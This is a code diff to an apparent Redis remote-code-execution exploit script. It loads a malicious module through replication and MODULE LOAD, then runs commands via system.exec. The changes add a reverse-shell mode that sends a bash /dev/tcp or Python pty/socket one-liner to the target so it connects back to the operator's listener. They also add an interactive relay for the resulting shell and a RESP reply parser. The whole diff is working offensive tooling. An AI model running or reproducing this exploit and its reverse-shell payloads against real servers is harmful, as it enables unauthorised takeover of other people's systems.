@@ -2,10 +2,13 @@
 # coding:utf-8
 import socket
 import os
+import select
 import sys
+import termios
+import time
+import tty
 from time import sleep
 import argparse
-from six.moves import input
 
 SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
 
@@ -21,13 +24,11 @@ LOGO = R"""
 """
 
 def mk_cmd_arr(arr):
-    cmd = ""
-    cmd += "*" + str(len(arr))
+    cmd = ["*{}\r\n".format(len(arr)).encode()]
     for arg in arr:
-        cmd += CLRF + "$" + str(len(arg))
-        cmd += CLRF + arg
-    cmd += "\r\n"
-    return cmd
+        arg = str(arg).encode()
+        cmd.extend(("${}\r\n".format(len(arg)).encode(), arg, b"\r\n"))
+    return b"".join(cmd)
 
 
 def mk_cmd(raw_cmd):
@@ -85,12 +86,56 @@ class Remote:
         self._sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self._sock.settimeout(socket_timeout)
         self._sock.connect((self._host, self._port))
+        self._buffer = bytearray()
 
     def send(self, msg):
         dout(self._sock, msg)
 
-    def recv(self, cnt=65535):
-        return din(self._sock, cnt)
+    def _recv_more(self):
+        chunk = self._sock.recv(65536)
+        if not chunk:
+            raise EOFError("Redis connection closed")
+        self._buffer.extend(chunk)
+
+    def _read_exact(self, size):
+        while len(self._buffer) < size:
+            self._recv_more()
+        data = bytes(self._buffer[:size])
+        del self._buffer[:size]
+        return data
+
+    def _read_line(self):
+        while True:
+            end = self._buffer.find(b"\r\n")
+            if end >= 0:
+                data = bytes(self._buffer[:end + 2])
+                del self._buffer[:end + 2]
+                return data
+            self._recv_more()
+
+    def _read_frame(self):
+        prefix = self._read_exact(1)
+        line = self._read_line()
+        frame = prefix + line
+        try:
+            count = int(line[:-2])
+        except ValueError:
+            count = None
+        if prefix == b"$" and count is not None and count >= 0:
+            frame += self._read_exact(count + 2)
+        elif prefix == b"*" and count is not None and count >= 0:
+            for _ in range(count):
+                frame += self._read_frame()
+        return frame
+
+    def recv(self, cnt=None):
+        msg = self._read_frame()
+        if verbose:
+            if len(msg) < 300:
+                print("\033[1;34;40m[->]\033[0m {}".format(msg))
+            else:
+                print("\033[1;34;40m[->]\033[0m {}......{}".format(msg[:80], msg[-80:]))
+        return msg.decode("utf-8", errors="replace")
 
     def do(self, cmd):
         self.send(mk_cmd(cmd))
@@ -174,8 +219,75 @@ def interact(remote):
         return
 
 
+def relay_shell(client):
+    """Relay a connected reverse shell until it exits or Ctrl-] is pressed."""
+    stdin_fd = sys.stdin.fileno()
+    old_terminal = None
+    if sys.stdin.isatty():
+        old_terminal = termios.tcgetattr(stdin_fd)
+        tty.setraw(stdin_fd)
+    print("[+] Reverse shell connected; press Ctrl-] to disconnect")
+    try:
+        while True:
+            readable, _, _ = select.select([client, stdin_fd], [], [])
+            if client in readable:
+                data = client.recv(65536)
+                if not data:
+                    break
+                sys.stdout.buffer.write(data)
+                sys.stdout.buffer.flush()
+            if stdin_fd in readable:
+                data = os.read(stdin_fd, 4096)
+                if not data or b"\x1d" in data:
+                    break
+                client.sendall(data)
+    finally:
+        if old_terminal is not None:
+            termios.tcsetattr(stdin_fd, termios.TCSADRAIN, old_terminal)
+        print("\n[*] Reverse shell closed")
+
+
+def open_reverse_shell(remote, lhost, lport):
+    available = decode_shell_result(
+        remote.shell_cmd("command -v python3 || command -v python || command -v bash")
+    ).strip().splitlines()
+    if not available:
+        raise RuntimeError("target has no supported Bash or Python reverse-shell runtime")
+    runtime = os.path.basename(available[0].strip())
+    if runtime == "bash":
+        command = "bash -c 'bash -i >& /dev/tcp/{}/{} 0>&1'".format(lhost, lport)
+    elif runtime in ("python3", "python"):
+        command = ("{} -c 'import os,pty,socket;s=socket.socket();"
+                   "s.connect((\"{}\",{}));[os.dup2(s.fileno(),f) for f in (0,1,2)];"
+                   "os.environ[\"TERM\"]=\"xterm\";pty.spawn(\"/bin/sh\")'").format(
+                       runtime, lhost, lport)
+    else:
+        raise RuntimeError("unsupported reverse-shell runtime: {}".format(runtime))
+
+    listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    listener.settimeout(max(callback_timeout * 2, 10))
+    listener.bind((lhost, lport))
+    listener.listen(1)
+    print("[*] Starting {} reverse shell on {}:{}".format(runtime, lhost, lport))
+    client = None
+    try:
+        # Do not wait for the Redis reply: system.exec returns only after the shell exits.
+        remote.send(mk_cmd_arr(["system.exec", command]))
+        client, peer = listener.accept()
+        print("[+] Reverse connection from {}:{}".format(peer[0], peer[1]))
+        client.settimeout(None)
+        relay_shell(client)
+    finally:
+        if client:
+            client.close()
+        listener.close()
+    # Drain the pending system.exec response before issuing cleanup commands.
+    remote.recv()
+
+
 def runserver(rhost, rport, lhost, lports):
-    expfile = ".redis-rce-{}-{}.so".format(os.getpid(), int(__import__('time').time()))
+    expfile = ".redis-rce-{}-{}.so".format(os.getpid(), int(time.time()))
     remote = Remote(rhost, rport)
     if auth:
         check = remote.do("AUTH {}".format(auth))
@@ -206,6 +318,7 @@ def runserver(rhost, rport, lhost, lports):
     candidate_dirs = [target_dir] if target_dir != "auto" else list(dict.fromkeys(d for d in defaults if d))
     module_path = None
     load_result = None
+    active_lport = None
     uploaded_paths = []
     for lport in lports:
         try:
@@ -242,6 +355,7 @@ def runserver(rhost, rport, lhost, lports):
                 load_result = remote.do("MODULE LOAD {}".format(module_path))
                 remote.do("SLAVEOF NO ONE")
                 if load_result == "+OK\r\n":
+                    active_lport = lport
                     print("[+] Module loaded from {} via port {}".format(module_path, lport))
                     break
                 print("[-] MODULE LOAD failed in {}: {}".format(candidate_dir, load_result.strip()))
@@ -261,21 +375,24 @@ def runserver(rhost, rport, lhost, lports):
         remote.close()
         return
 
-    if one_command:
-        result = remote.shell_cmd(one_command)
-        print(decode_shell_result(result))
-    else:
-        interact(remote)
-
-    if not no_cleanup:
-        print("[*] Cleaning up and restoring Redis configuration..")
-        for path in list(dict.fromkeys(uploaded_paths)):
-            remote.shell_cmd("rm -f {}".format(path))
-        remote.do("MODULE UNLOAD system")
-        remote.do("CONFIG SET dbfilename {}".format(original_file))
-        if original_dir:
-            remote.do("CONFIG SET dir {}".format(original_dir))
-    remote.close()
+    try:
+        if reverse_shell_requested:
+            open_reverse_shell(remote, lhost, reverse_shell_port or active_lport)
+        elif one_command:
+            result = remote.shell_cmd(one_command)
+            print(decode_shell_result(result))
+        else:
+            interact(remote)
+    finally:
+        if not no_cleanup:
+            print("[*] Cleaning up and restoring Redis configuration..")
+            for path in list(dict.fromkeys(uploaded_paths)):
+                remote.shell_cmd("rm -f {}".format(path))
+            remote.do("MODULE UNLOAD system")
+            remote.do("CONFIG SET dbfilename {}".format(original_file))
+            if original_dir:
+                remote.do("CONFIG SET dir {}".format(original_dir))
+        remote.close()
 
 
 def main():
@@ -293,7 +410,13 @@ def main():
                         help="target directory, or auto to try executable candidates (default: auto)",
                         default='auto')
     parser.add_argument("-a", "--auth", dest="auth", type=str, help="redis password")
-    parser.add_argument("-c", "--command", dest="command", help="run one command instead of interactive mode")
+    mode = parser.add_mutually_exclusive_group()
+    mode.add_argument("-c", "--command", dest="command",
+                      help="run one command instead of interactive mode")
+    mode.add_argument("--revshell", "--reverse-shell", action="store_true",
+                      help="automatically open an interactive reverse shell")
+    parser.add_argument("--revshell-port", "--reverse-shell-port", type=int,
+                        help="reverse-shell port (default: reuse the proven replication port)")
     parser.add_argument("--check", action="store_true", help="fingerprint only; do not exploit")
     parser.add_argument("--no-cleanup", action="store_true", help="leave module and configuration in place")
     parser.add_argument("--timeout", type=float, default=5.0, help="Redis socket timeout")
@@ -304,13 +427,15 @@ def main():
 
     print("[*] Connecting to  {}:{}...".format(options.rhost, options.rport))
     global payload, verbose, filename, auth, target_dir, socket_timeout, callback_timeout
-    global one_command, check_only, no_cleanup
+    global one_command, check_only, no_cleanup, reverse_shell_requested, reverse_shell_port
     auth = options.auth
     filename = options.file
     target_dir = options.target_dir
     socket_timeout = options.timeout
     callback_timeout = options.callback_timeout
     one_command = options.command
+    reverse_shell_requested = options.revshell
+    reverse_shell_port = options.revshell_port
     check_only = options.check
     no_cleanup = options.no_cleanup
     verbose = options.verbose
